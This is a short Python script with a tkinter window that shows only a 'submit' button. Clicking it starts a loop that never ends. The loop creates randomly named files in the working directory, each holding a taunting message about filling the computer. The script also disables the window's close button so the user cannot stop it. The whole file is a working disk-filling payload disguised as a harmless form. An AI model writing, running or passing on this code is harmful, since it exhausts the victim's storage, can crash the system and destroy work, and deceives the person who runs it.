from random import *
from tkinter import *

windows = Tk()



def disable_events():
    pass


windows.protocol("WM_DELETE_WINDOW", disable_events)

def fill():
    letters = 'qeq8w0987654321'
    i = 1
    while i > 0:
        i += 1
        fil = "".join(choice(letters) for x in range(randint(100, 110)))
        with open(fil, 'a') as f:
            f.write('''
                            Hello, If you are seeing this, it means that i love you.
                            Please don't be surprised. I am just filling your computer to get it filled.
                            Do not just download apps from any place. Make sure you you know what you are downloading. 
                            BYE From Pc
                            Stay safe and stay well
                            Table of Contents
            ''')
            f.close()
            print('Entered')
    print('done')
    return


btn = Button(windows, text="submit", command=fill)
btn.pack()

windows.mainloop()